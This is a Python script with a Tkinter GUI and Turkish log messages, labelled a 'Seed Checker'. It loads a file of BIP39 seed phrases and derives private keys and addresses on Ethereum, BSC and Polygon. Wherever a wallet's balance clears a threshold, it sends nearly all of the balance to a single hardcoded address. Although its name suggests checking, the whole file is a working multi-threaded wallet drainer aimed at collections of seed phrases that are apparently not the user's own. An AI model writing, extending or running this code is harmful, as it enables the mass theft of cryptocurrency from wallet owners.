import requests
from web3 import Web3
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
from concurrent.futures import ThreadPoolExecutor
import tkinter as tk
from tkinter import filedialog, scrolledtext
import threading

NETWORKS = {
    "ethereum": {
        "coin": Bip44Coins.ETHEREUM,
        "rpcs": [
            "https://eth.llamarpc.com", "https://0xrpc.io/eth",
            "https://1rpc.io/eth", "https://eth-mainnet.public.blastapi.io"
        ],
        "min_balance": 0.003,
        "target": "0x58A058E6E5AEFa24565b7f75CE07bB5eF4517D78",
    },
    "bsc": {
        "coin": Bip44Coins.BINANCE_SMART_CHAIN,
        "rpcs": [
            "https://bsc.therpc.io", "https://binance.llamarpc.com",
            "https://1rpc.io/bnb", "https://bsc-rpc.publicnode.com"
        ],
        "min_balance": 0.003,
        "target": "0x58A058E6E5AEFa24565b7f75CE07bB5eF4517D78",
    },
    "polygon": {
        "coin": Bip44Coins.POLYGON,
        "rpcs": [
            "https://polygon-rpc.com", "https://rpc-mainnet.matic.network",
            "https://matic-mainnet.chainstacklabs.com", "https://rpc.ankr.com/polygon"
        ],
        "min_balance": 1,
        "target": "0x58A058E6E5AEFa24565b7f75CE07bB5eF4517D78",
    }
}

GAS_RESERVE = {
    "ethereum": 0.002,
    "bsc": 0.002,
    "polygon": 0.01
}

def log(text):
    output_box.insert(tk.END, text + "\n")
    output_box.see(tk.END)

def get_working_rpc(rpcs):
    for rpc in rpcs:
        try:
            r = requests.get(rpc, timeout=5)
            if r.status_code == 200:
                return rpc
        except:
            continue
    return None

def get_balance(w3, address):
    try:
        return w3.eth.get_balance(address) / 1e18
    except:
        return 0

def send_transfer(w3, priv_key, to_addr, amount):
    acct = w3.eth.account.from_key(priv_key)
    try:
        gas_price = w3.eth.gas_price
        gas_limit = 21000
        gas_cost = gas_price * gas_limit
        amount_wei = w3.to_wei(amount, 'ether')
        balance = w3.eth.get_balance(acct.address)

        if balance < amount_wei + gas_cost:
            log(f"[{acct.address}] Yeterli bakiye yok. Mevcut: {balance / 1e18:.6f} ETH")
            return

        nonce = w3.eth.get_transaction_count(acct.address)
        tx = {
            'to': to_addr,
            'value': amount_wei,
            'gas': gas_limit,
            'gasPrice': gas_price,
            'nonce': nonce,
            'chainId': w3.eth.chain_id
        }
        signed_tx = w3.eth.account.sign_transaction(tx, priv_key)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        log(f"[{acct.address}] Transfer gönderildi: {tx_hash.hex()}")
    except Exception as e:
        log(f"[{acct.address}] Transfer hatası: {e}")

def process_seed(seed_phrase):
    mnemo = Mnemonic("english")
    if not mnemo.check(seed_phrase):
        log("[!] Geçersiz seed phrase: " + seed_phrase)
        return

    seed_bytes = Bip39SeedGenerator(seed_phrase).Generate()

    for net in ["ethereum", "bsc", "polygon"]:
        cfg = NETWORKS[net]
        rpc_url = get_working_rpc(cfg["rpcs"])
        if not rpc_url:
            log(f"[{net.upper()}] Çalışan RPC bulunamadı.")
            continue

        w3 = Web3(Web3.HTTPProvider(rpc_url))
        bip44_ctx = Bip44.FromSeed(seed_bytes, cfg["coin"]).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
        address = bip44_ctx.PublicKey().ToAddress()
        priv_key = bip44_ctx.PrivateKey().Raw().ToHex()
        balance = get_balance(w3, address)
        log(f"[{net.upper()}] {address} bakiyesi: {balance:.6f}")
        if balance >= cfg["min_balance"] + GAS_RESERVE[net]:
            amount_to_send = balance - GAS_RESERVE[net]
            log(f"[{net.upper()}] Transfer başlatılıyor: {amount_to_send:.6f}")
            send_transfer(w3, priv_key, cfg["target"], amount_to_send)
        else:
            log(f"[{net.upper()}] Yetersiz bakiye, transfer yapılmıyor.")

def start_process(file_path):
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            seeds = [line.strip() for line in f if line.strip()]
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(process_seed, seeds)
    except Exception as e:
        log("[HATA] Dosya okunamadı: " + str(e))

def select_file():
    path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if path:
        file_path_var.set(path)

def start_thread():
    path = file_path_var.get()
    if path:
        threading.Thread(target=start_process, args=(path,), daemon=True).start()
    else:
        log("[!] Lütfen önce bir .txt dosyası seçin.")

# GUI
window = tk.Tk()
window.title("Seed Checker GUI")
window.geometry("700x500")

file_path_var = tk.StringVar()

btn_select = tk.Button(window, text="Dosya Seç (.txt)", command=select_file)
btn_select.pack(pady=10)

entry_path = tk.Entry(window, textvariable=file_path_var, width=80)
entry_path.pack(pady=5)

btn_start = tk.Button(window, text="İşlem Başlat", command=start_thread, bg="green", fg="white")
btn_start.pack(pady=10)

output_box = scrolledtext.ScrolledText(window, width=85, height=20)
output_box.pack(padx=10, pady=10)

window.mainloop()
